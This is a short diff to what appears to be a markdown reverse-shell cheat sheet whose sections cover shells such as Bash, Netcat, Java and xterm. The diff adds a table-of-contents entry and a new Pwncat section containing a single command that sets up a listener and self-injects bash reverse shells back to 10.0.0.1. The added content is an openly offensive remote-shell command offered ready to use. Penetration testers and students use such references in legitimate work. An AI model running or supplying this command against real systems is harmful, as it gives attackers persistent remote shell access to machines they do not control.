@@ -9,6 +9,7 @@
 - [[#Netcat]]
 - [[#Java]]
 - [[#xterm]]
+- [[#pwncat]]
 
 
 ### Bash
@@ -74,6 +75,13 @@ p.waitFor()
 ````
 
 [Untested submission from anonymous reader]
+
+### Pwncat
+
+```bash
+pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
+```
+
 
 ### xterm
 
